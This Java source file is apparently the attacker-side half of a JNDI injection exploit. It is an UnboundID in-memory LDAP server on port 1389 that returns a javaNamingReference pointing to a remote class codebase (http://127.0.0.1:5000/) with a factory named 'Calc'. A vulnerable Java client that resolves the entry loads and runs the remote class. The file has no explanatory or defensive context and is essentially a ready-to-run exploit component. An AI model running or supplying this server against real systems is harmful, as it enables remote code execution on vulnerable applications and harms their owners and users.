package ldap;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class ReferenceLdapServer {
    public static void main(String[] args) throws Exception {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen", //$NON-NLS-1$
                InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                1389,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.setSchema(null);
        config.setEnforceAttributeSyntaxCompliance(false);
        config.setEnforceSingleStructuralObjectClass(false);

        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        ds.add("dn: " + "dc=example,dc=com", "k: k");
        ds.add("dn: " + "uid=kingkk,dc=example,dc=com", "javaCodeBase: http://127.0.0.1:5000/",
                "objectClass: javaNamingReference", "javaFactory: Calc", "javaClassName: foo");

        System.out.println("Listening on 0.0.0.0:" + 1389); //$NON-NLS-1$
        ds.startListening();
    }
}
